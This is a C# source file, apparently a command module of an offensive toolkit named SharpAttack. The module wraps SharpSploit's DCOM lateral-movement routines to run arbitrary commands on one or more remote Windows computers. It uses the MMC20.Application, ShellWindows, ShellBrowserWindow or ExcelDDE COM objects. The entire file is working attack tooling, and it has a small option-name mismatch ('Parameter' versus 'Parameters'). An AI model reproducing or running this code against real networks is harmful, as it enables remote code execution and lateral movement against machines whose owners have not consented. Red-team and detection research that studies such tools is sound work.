using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using SharpAttack.Utils;

using SharpSploit.LateralMovement;

namespace SharpAttack.Commands
{
  class DcomExec : Command
  {
    public override void Run(Dictionary<String, Parameter> RunParams)
    {
      string Parameters = null;
      DCOM.DCOMMethod Method = DCOM.DCOMMethod.MMC20_Application;
      if (RunParams.TryGetValue("Parameters", out Parameter parameters))
      {
        Parameters = parameters.Value[0];
      }

      if (RunParams.TryGetValue("Method", out Parameter method))
      {
        string value = method.Value[0];

        switch (value)
        {
          case "MMC20":
            Method = DCOM.DCOMMethod.MMC20_Application;
            break;
          case "ShellWindow":
            Method = DCOM.DCOMMethod.ShellWindows;
            break;
          case "ShellBrowserWindow":
            Method = DCOM.DCOMMethod.ShellBrowserWindow;
            break;
          case "ExcelDDE":
            Method = DCOM.DCOMMethod.ExcelDDE;
            break;
          default:
            Printing.Error($"{value} is not a valid method");
            break;
        }
      }

      if (RunParams.TryGetValue("ComputerName", out Parameter computer))
      {
        if (RunParams.TryGetValue("Command", out Parameter command))
        {
          foreach (string cmd in command.Value)
          {
            DCOM.DCOMExecute(computer.Value, cmd, Parameters, null, Method);
          }
        }
        else
        {
          Printing.Error("No command specified");
        }
      }
      else
      {
        Printing.Error("No Computer Name specified.");
      }
    }

    public DcomExec()
    {
      Name = "DcomExec";
      Helptext = "Executes a command against a remote machine through DCOM objects";
      Parameters.Add("ComputerName", new Parameter("Name of the Computer to execute the command on. Accepts a comma seperated list. Required.", 0));
      Parameters.Add("Command", new Parameter("Command to Run. Required.", 1));
      Parameters.Add("Parameter", new Parameter("Parameters for command. Enclose in quotes if there are spaces"));
      Parameters.Add("Method", new Parameter("COM Object to use. Options are: MMC20, ShellWindow, ShellBrowserWindow, and ExcelDDE. Defaults to MMC20."));
      Register();
    }
  }
}
